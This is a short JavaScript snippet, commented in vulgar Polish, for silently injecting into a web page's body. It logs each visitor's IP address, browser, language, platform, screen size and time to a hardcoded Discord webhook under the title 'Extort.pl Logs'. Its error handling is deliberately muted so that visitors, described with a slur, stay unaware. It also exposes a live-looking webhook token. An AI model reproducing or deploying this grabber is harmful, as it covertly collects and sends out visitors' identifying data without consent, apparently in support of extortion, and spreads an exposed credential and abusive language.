// wpierdolic do <body> klasycznie 

(async function() {
    try {
        // log ip i chuj wie co tam jakies moze gowno z przegladarki od api
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();

        const ip = data.ip;

        const userAgent = navigator.userAgent;
        const language = navigator.language || navigator.userLanguage;
        const platform = navigator.platform;
        const screen = '${screen.width}x${screen.height}';
        const timestamp = new Date().toISOString();

        // embed i chuj
        const payload = {
            embeds: [{
                title: "Extort.pl Logs",
                color: 0xFF4444,
                fields: [
                    { name: "IP", value: '\'${ip}\'', inline: true},
                    { name: "Czas", value: timestamp, inline: true},
                    { name: "Przeglądarka", value: userAgent.slice(0, 80) + "...", inline: false},
                    { name: "Język", value: language, inline: true},
                    { name: "Platforma", value: platform, inline: true},
                    { name: "Rozdzielczość", value: screen, inline: true},
                ],
                footer: {
                    text: "log gowno " + window.location.hostname
                },
                timestamp: timestamp
            }]
        };

        // url
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1460784608802111641/7k6dglNhU_zHHmLaRVsxnXznNE2ndWqDIdkvJvGJe65WNWXkt3uAzodRgGM7ToAmkdgW"

        // wysyla tera
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

    } catch (err) {
        // wyjebane jajca zeby cwele nie ogarnialy bledow bo bedzie lipa jak wycieknie api
        // console.error("Logger error:", err);
    }

})();
